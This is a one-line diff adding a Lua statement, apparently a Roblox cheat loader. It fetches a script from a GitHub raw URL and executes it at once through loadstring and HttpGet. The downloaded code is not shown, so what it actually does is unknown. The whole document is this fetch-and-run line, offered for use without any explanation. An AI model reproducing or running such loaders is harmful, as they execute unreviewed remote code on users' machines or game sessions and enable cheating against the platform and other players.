@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Centeryeabyss/loaders/main/loaders/ultimate-easy-obby-spam3-wc9vhv48o18p0a.lua"))()
